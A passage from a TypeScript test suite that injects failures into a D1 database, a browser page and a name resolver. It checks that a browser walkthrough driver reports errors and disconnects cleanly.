    const brokenDb = {
      ...store,
      db: {
        prepare: () => ({
          bind: () => ({
            run: () => Promise.reject(new Error("D1 down")),
            first: () => Promise.reject(new Error("D1 down")),
          }),
        }),
      } as unknown as D1Database,
    };
    const opened = await walk({ store: brokenDb });
    expect(opened.driver.ended?.outcome).toBe("error");
    expect(opened.browser.connected).toBe(false);
    // The action's own write failing, on a walk that opened with working storage: a valid action and a malformed one.
    for (const input of [{ tool: "screenshot" }, { tool: "nope" }]) {
      let failing = false;
      let attempted = 0;
      const actionsFail = new Proxy(env.DB, {
        get(target, key) {
          if (key !== "prepare") return Reflect.get(target, key);
          return (sql: string) => {
            const statement = target.prepare(sql);
            if (!sql.includes("walkthrough_actions")) return statement;
            return {
              bind: (...values: unknown[]) => {
                if (!failing || values[3] !== "action") return statement.bind(...values);
                attempted++;
                return { run: () => Promise.reject(new Error("D1 down")) };
              },
            };
          };
        },
      }) as D1Database;
      const live = await walk({ store: { ...store, db: actionsFail } });
      expect(live.driver.ended, input.tool).toBeUndefined();
      failing = true;
      expect((await live.driver.execute(input)).outcome, input.tool).toBe("error");
      expect(attempted, input.tool).toBeGreaterThan(0);
      expect(live.browser.connected, input.tool).toBe(false);
    }

    const page = await walk();
    await (await walkPage(page.browser)).close();
    expect((await page.driver.execute({ tool: "click", x: 5, y: 5 })).outcome).toBe("error");
    expect(page.browser.connected).toBe(false);

    let calls = 0;
    const flaky: Resolve = async (name) => {
      calls++;
      if (calls > 3) throw new Error("resolver down");
      return resolve(name);
    };
    const interception = await walk({ resolve: flaky });
    const answer = await interception.driver.execute({ tool: "click", x: 20, y: 290 });
    expect(answer.outcome).not.toBe("done");
    expect(interception.browser.connected).toBe(false);
  });
});
